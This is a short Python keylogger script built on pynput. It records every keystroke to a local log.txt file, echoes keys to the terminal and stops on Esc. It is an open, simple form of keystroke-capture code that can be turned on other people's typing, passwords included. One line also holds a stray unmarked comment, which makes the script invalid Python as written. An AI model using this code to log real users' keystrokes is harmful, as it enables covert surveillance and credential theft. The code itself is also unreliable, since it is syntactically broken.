from pynput.keyboard import Key, KeyCode, Listener
import os

keys_pressed = []  # List to store pressed keys

def on_press(key):

    keys_pressed.append(key)
    write_file(keys_pressed)

    try:
        print(f'Alphanumeric key {key.char} pressed')
        
    except AttributeError:
        print(f'Special key {key} pressed')


def write_file(keys):

    with open('log.txt', 'a') as f: 

        for key in keys:
            k = str(key).replace("'", "")  key string
            #f.write(k)

            if k == 'Key.space':
                f.write(' ')  

            elif k.startswith('Key'):
                pass

            else:
                f.write(k)
        keys.clear()  


def on_release(key):
    print(f'{key} released')
    os.system('clear') # Clear terminal
    if key == Key.esc:  # Stop listener on escape key press
        return False


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()